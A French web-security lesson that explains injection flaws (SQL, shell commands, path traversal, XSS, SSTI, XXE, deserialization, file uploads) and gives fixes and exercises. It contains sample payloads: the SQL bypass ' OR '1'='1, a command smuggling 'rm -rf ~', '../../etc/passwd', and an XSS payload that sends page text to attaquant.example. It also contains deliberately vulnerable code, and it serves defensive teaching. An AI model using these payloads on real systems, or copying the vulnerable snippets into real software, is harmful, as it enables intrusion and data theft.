---
title: Injections et XSS
description: "Injection SQL, injection de commandes, traversée de répertoires, cross-site scripting, puis SSTI, XXE, désérialisation et téléversement de fichiers : comprendre le mécanisme commun et appliquer les bonnes défenses."
duration: 70
objectives:
  - Expliquer le mécanisme commun à toutes les injections
  - Corriger une injection SQL avec des requêtes paramétrées
  - Éviter l'injection de commandes et la traversée de répertoires
  - Prévenir les XSS par l'encodage contextuel, l'assainissement et la CSP
  - Reconnaître et corriger les SSTI, XXE, désérialisations non sûres et téléversements dangereux
---

# Le mécanisme commun

Une **injection** se produit quand une donnée fournie par l'utilisateur est insérée dans un **langage interprété** (SQL, commande système, HTML, JavaScript…) de façon à être interprétée comme du **code** plutôt que comme une **donnée**.

```diagram
type: compare
title: Donnée ou code ?
columns:
  - title: "Vulnérable : concaténation"
    tone: rose
    items:
      - La donnée est collée dans une chaîne de code
      - Des caractères spéciaux (', ;, <, >) changent le sens du code
      - L'attaquant écrit une partie du programme
  - title: "Sûr : séparation"
    tone: teal
    items:
      - Le code et les données sont transmis séparément
      - L'interpréteur sait que la donnée n'est qu'une donnée
      - Requêtes paramétrées, listes d'arguments, encodage contextuel
```

Règle générale : **ne jamais construire du code par concaténation de chaînes contenant des données non maîtrisées.** Et toute donnée venant de l'extérieur est non maîtrisée : paramètres d'URL, formulaires, en-têtes HTTP, cookies, fichiers téléversés, réponses d'API tierces, contenus de la base remplis par d'autres utilisateurs.

# L'injection SQL

```python
# VULNÉRABLE : la saisie est collée dans la requête
def trouver_utilisateur(connexion, email: str):
    requete = f"SELECT id, nom FROM utilisateurs WHERE email = '{email}'"
    return connexion.execute(requete).fetchone()
```

Si l'attaquant saisit `' OR '1'='1`, la requête devient :

```sql
SELECT id, nom FROM utilisateurs WHERE email = '' OR '1'='1'
```

La condition est toujours vraie. Selon la requête, une injection SQL peut permettre de **contourner une authentification**, de **lire toute la base** (y compris les tables d'autres applications), de **modifier ou supprimer** des données, voire d'exécuter des commandes sur le serveur dans certaines configurations.

## La correction : les requêtes paramétrées

```python
# SÛR : la requête et la donnée sont envoyées séparément
def trouver_utilisateur(connexion, email: str):
    return connexion.execute(
        "SELECT id, nom FROM utilisateurs WHERE email = %s",   # marqueur (syntaxe psycopg)
        (email,),
    ).fetchone()
```

La base reçoit la structure de la requête d'un côté, la valeur de l'autre : quelle que soit la saisie, elle reste une **valeur** comparée à la colonne `email`. Le marqueur dépend du pilote (`%s` pour psycopg, `?` pour sqlite3, `$1` pour PostgreSQL en Node.js).

> [!WARNING]
> Un ORM protège tant qu'on utilise son API normale, mais **pas** si l'on construit du SQL brut par concaténation (`raw()`, `text()`, `execute(f"...")`). De même, les **noms de colonnes ou de tables** (par exemple pour un tri) ne peuvent pas être paramétrés : validez-les contre une **liste blanche** de valeurs autorisées.

```python
COLONNES_TRI = {"nom", "cree_le", "email"}

def lister(connexion, tri: str):
    if tri not in COLONNES_TRI:
        raise ValueError("Tri non autorisé")
    return connexion.execute(f"SELECT id, nom FROM utilisateurs ORDER BY {tri}").fetchall()
```

Défenses complémentaires (défense en profondeur) : compte de base de données avec **droits minimaux** pour l'application (pas d'administrateur, pas d'accès aux autres bases), messages d'erreur génériques, journalisation des erreurs SQL inhabituelles.

```video
url: https://www.youtube.com/watch?v=ciNHn38EyRc
title: "Running an SQL Injection Attack - Computerphile"
channel: "Computerphile"
duration: "17:11"
lang: en
why: "Une injection SQL réalisée pas à pas par Computerphile, pour voir concrètement comment une requête est détournée."
```

# Injection de commandes et traversée de répertoires

## L'injection de commandes

```python
import subprocess

# VULNÉRABLE : un shell interprète la chaîne ; « exemple.fr; rm -rf ~ » exécute deux commandes
subprocess.run(f"ping -c 1 {hote}", shell=True)

# SÛR : liste d'arguments, pas de shell ; la saisie n'est qu'un argument
subprocess.run(["ping", "-c", "1", hote], check=True, timeout=10)
```

Mieux encore : **éviter d'appeler des commandes système** quand une bibliothèque fait le travail, et **valider** strictement l'entrée (ici, un nom d'hôte ou une adresse IP valide).

## La traversée de répertoires

```python
from pathlib import Path

DOSSIER = Path("/srv/app/documents").resolve()

def lire_document(nom: str) -> bytes:
    chemin = (DOSSIER / nom).resolve()
    # Refuser tout chemin qui sort du dossier autorisé (par exemple « ../../etc/passwd »)
    if not chemin.is_relative_to(DOSSIER):
        raise PermissionError("Chemin non autorisé")
    return chemin.read_bytes()
```

Sans cette vérification, un nom comme `../../etc/passwd` permet de lire n'importe quel fichier accessible au processus. Préférez encore des **identifiants** (un numéro de document en base) aux noms de fichiers fournis par l'utilisateur.

# Le cross-site scripting (XSS)

Une **XSS** est une injection dans une **page web** : l'attaquant fait exécuter **son** JavaScript dans le navigateur d'**autres** utilisateurs, avec les droits de ceux-ci sur le site. Il peut alors agir en leur nom (changer leur e-mail, envoyer des messages), lire les données affichées, modifier la page (faux formulaire de connexion).

```diagram
type: compare
title: Les trois types de XSS
columns:
  - title: Réfléchie
    tone: amber
    items:
      - Le script est dans la requête (lien piégé)
      - La page le renvoie immédiatement
      - "Exemple : un paramètre de recherche réaffiché"
  - title: Stockée
    tone: rose
    items:
      - Le script est enregistré (commentaire, profil)
      - Exécuté chez chaque visiteur de la page
      - La plus dangereuse
  - title: Basée sur le DOM
    tone: blue
    items:
      - Le JavaScript de la page insère lui-même la donnée
      - innerHTML, document.write avec une donnée de l'URL
      - Le serveur peut ne rien voir
```

Exemple de code vulnérable côté serveur : un gabarit qui insère le pseudonyme sans l'échapper. Si un utilisateur choisit comme pseudonyme `<img src=x onerror="fetch('https://attaquant.example/?c='+document.body.innerText)">`, le contenu de la page de chaque visiteur part chez l'attaquant.

## Les défenses

1. **Encodage contextuel en sortie** : transformer les caractères spéciaux selon l'endroit où la donnée est insérée. Dans du HTML, `<` devient `&lt;`, `"` devient `&quot;`… Les **moteurs de gabarits modernes** (Jinja2 avec l'échappement automatique activé, Django, Twig) et **React**, Vue ou Angular **échappent par défaut** : ne contournez pas cette protection.
2. **Se méfier des échappatoires** : `dangerouslySetInnerHTML` (React), `v-html` (Vue), `innerHTML`, `|safe` (Jinja2), `document.write`. Côté client, utilisez `textContent` plutôt que `innerHTML`.
3. **Assainir le HTML** quand on doit vraiment accepter du HTML riche (éditeur de texte) : une bibliothèque éprouvée comme **DOMPurify** ne garde qu'une liste blanche de balises et d'attributs.
4. **Valider les URL** fournies par l'utilisateur : un lien `javascript:...` dans un attribut `href` exécute du code ; n'autorisez que `https:` (et `http:` si nécessaire).
5. **Content-Security-Policy** stricte : même si une injection passe, le navigateur refuse d'exécuter les scripts non autorisés.
6. **Cookies `HttpOnly`** : le script injecté ne peut pas lire le cookie de session (mais il peut toujours agir dans la page : ce n'est qu'une limitation de l'impact).

```javascript
// VULNÉRABLE : le contenu de l'URL est interprété comme du HTML
document.getElementById("message").innerHTML = new URLSearchParams(location.search).get("msg");

// SÛR : le contenu est inséré comme du texte
document.getElementById("message").textContent = new URLSearchParams(location.search).get("msg");
```

> [!IMPORTANT]
> La **validation des entrées** (refuser ce qui n'a pas le format attendu) est utile mais **ne remplace pas** l'encodage en sortie : un nom de famille légitime peut contenir une apostrophe (`O'Brien`), un message peut légitimement contenir `<`. La défense principale contre les injections est la **séparation code/données** au moment de l'utilisation.

```video
url: https://www.youtube.com/watch?v=L5l9lSnNMxg
title: "Cracking Websites with Cross Site Scripting - Computerphile"
channel: "Computerphile"
duration: "8:34"
lang: en
why: "Le cross-site scripting démontré par Computerphile : comment un script injecté s'exécute dans le navigateur d'une autre personne."
```

# Autres vulnérabilités côté serveur

Le même principe (une donnée qui devient du code ou qui pilote un traitement dangereux) se retrouve dans d'autres familles de failles, moins fréquentes mais souvent critiques.

## L'injection de gabarit côté serveur (SSTI)

Quand une application construit un **gabarit** à partir d'une saisie (au lieu de passer la saisie **comme variable** au gabarit), le moteur de gabarits exécute les expressions qu'elle contient, ce qui peut mener à l'exécution de code sur le serveur.

```python
from jinja2 import Environment
env = Environment(autoescape=True)

# VULNÉRABLE : la saisie fait partie du gabarit ; « {{ 7*7 }} » affiche 49, et pire est possible
page = env.from_string("Bonjour " + prenom).render()

# SÛR : le gabarit est fixe, la saisie n'est qu'une variable
page = env.from_string("Bonjour {{ prenom }}").render(prenom=prenom)
```

## Les entités externes XML (XXE)

Certains analyseurs XML acceptent par défaut des **entités externes** : un document XML envoyé par l'attaquant peut alors faire lire un fichier local du serveur ou appeler une URL interne (comme une SSRF). Défense : désactiver les DTD et entités externes (en Python, la bibliothèque **defusedxml** le fait), ou préférer JSON.

## La désérialisation non sûre

Certains formats de sérialisation reconstruisent des **objets** et peuvent exécuter du code pendant la lecture : `pickle` en Python, la sérialisation native de Java ou de PHP. Désérialiser des données venues de l'extérieur avec ces formats revient à exécuter le code de l'attaquant. Défense : n'échanger que des **formats de données** (JSON) validés par un schéma, et ne jamais désérialiser de format natif reçu d'une source non fiable.

## Le téléversement de fichiers

Un formulaire d'envoi de fichiers (photo de profil, pièce justificative) est une porte d'entrée classique :

- **vérifier le type réel** du contenu, pas seulement l'extension ou l'en-tête `Content-Type` envoyés par le client ;
- **renommer** le fichier (identifiant aléatoire) et le stocker **hors de la racine web**, ou dans un stockage objet, pour qu'il ne puisse jamais être exécuté par le serveur ;
- limiter la **taille** et le nombre de fichiers ;
- servir les fichiers depuis un **domaine séparé** ou avec `Content-Disposition: attachment` pour éviter qu'un HTML ou un SVG téléversé n'exécute du script sur votre domaine ;
- **analyser** les fichiers (antivirus) quand ils sont partagés avec d'autres utilisateurs.

> [!TIP]
> Ces failles ont un point commun avec les injections : elles apparaissent quand on **interprète** une donnée externe (comme gabarit, comme document XML avec ses entités, comme objet, comme programme). La question à se poser devant chaque donnée externe : « qu'est-ce qui va l'interpréter, et peut-elle en changer le sens ? »

# Exercices

## Exercice 1 : Corriger une injection SQL

Corrigez cette fonction (pilote `sqlite3`) :

```python
def recherche(conn, nom, ville):
    return conn.execute(
        "SELECT * FROM clients WHERE nom LIKE '%" + nom + "%' AND ville = '" + ville + "'"
    ).fetchall()
```

<details>
<summary>Voir la solution</summary>

```python
def recherche(conn, nom: str, ville: str):
    return conn.execute(
        "SELECT id, nom, ville FROM clients WHERE nom LIKE ? AND ville = ?",
        (f"%{nom}%", ville),
    ).fetchall()
```

Les jokers `%` font partie de la **valeur** passée en paramètre, pas de la requête. On sélectionne aussi les colonnes utiles plutôt que `*`.

</details>

## Exercice 2 : Identifier le type de XSS

1. Un commentaire contenant un script est affiché à tous les lecteurs d'un article.
2. Un lien piégé `https://site.fr/recherche?q=<script>…</script>` affiche le terme recherché sans l'échapper.
3. Le JavaScript de la page lit `location.hash` et l'insère avec `innerHTML`.

<details>
<summary>Voir la solution</summary>

1. **Stockée**.
2. **Réfléchie**.
3. **Basée sur le DOM**.

Défenses communes : encodage contextuel (échappement automatique des gabarits, `textContent` côté client), CSP stricte, cookies `HttpOnly`.

</details>

## Exercice 3 : Revue de code

Relevez les vulnérabilités de ce code Flask et proposez des corrections.

```python
@app.route("/rapport")
def rapport():
    fichier = request.args["fichier"]
    os.system("convert /data/" + fichier + " /tmp/rapport.pdf")
    return "<h1>Rapport " + fichier + " généré</h1>"
```

<details>
<summary>Voir la solution</summary>

1. **Injection de commandes** : `fichier` est concaténé dans une commande shell (`os.system`). Correction : `subprocess.run(["convert", str(chemin), "/tmp/rapport.pdf"], check=True)`, sans shell.
2. **Traversée de répertoires** : `../../etc/...` permet de sortir de `/data/`. Correction : résoudre le chemin et vérifier qu'il reste dans `/data` (ou utiliser un identifiant de document).
3. **XSS réfléchie** : `fichier` est inséré dans le HTML sans échappement. Correction : utiliser un gabarit avec échappement automatique (`render_template`) ou `markupsafe.escape(fichier)`.
4. Bonus : validation stricte du nom (liste blanche de caractères, extension attendue) et fichier de sortie unique par requête.

</details>

# Sketchnote : l'essentiel à retenir

```sketchnote
title: Injections et XSS
center: Ne jamais laisser une donnée devenir du code ; séparer code et données au moment de l'utilisation.
points:
  - icon: database
    title: Injection SQL
    text: Requêtes paramétrées, liste blanche pour les noms de colonnes, compte de base minimal.
  - icon: terminal
    title: Commandes
    text: Liste d'arguments sans shell, ou mieux une bibliothèque ; entrée validée.
  - icon: file
    title: Chemins
    text: Résoudre le chemin et vérifier qu'il reste dans le dossier autorisé.
  - icon: code
    title: XSS
    text: Échappement automatique des gabarits, textContent, DOMPurify, URL validées.
  - icon: shield
    title: Défense en profondeur
    text: CSP stricte, cookies HttpOnly, erreurs génériques, validation des entrées.
  - icon: alert
    title: Autres interprètes
    text: Gabarits fixes, XML sans entités externes, pas de pickle externe, fichiers renommés hors racine web.
pitfall: Croire qu'un ORM ou la validation des entrées suffisent, puis concaténer du SQL brut ou utiliser innerHTML.
remember: Toute donnée venue de l'extérieur, y compris de votre propre base, doit être traitée comme une donnée, jamais comme du code.
```
